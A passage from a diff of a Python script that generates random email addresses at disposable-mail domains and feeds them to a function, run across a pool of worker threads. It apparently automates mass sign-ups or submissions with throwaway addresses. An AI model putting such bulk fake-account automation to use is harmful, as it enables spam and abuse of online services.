+    ail ="".join(random.choice(letters) for _ in range(1))
+    cil="".join(random.choice(letters) for _ in range(6))
+    if cl==1:
+        email=cil+'@' + 'hi2.in'
+    elif cl==2:
+        email=cil+'@'+'telegmail.com'
+    elif cl==3:
+        email=cil+'@'+ema
     em(email)
 
 def worker():
@@ -645,7 +843,7 @@ def worker():
         qq()
 
 from concurrent.futures import ThreadPoolExecutor
-threads_count = 50
+threads_count = 20
 
 with ThreadPoolExecutor(max_workers=threads_count) as executor:
     for _ in range(threads_count):
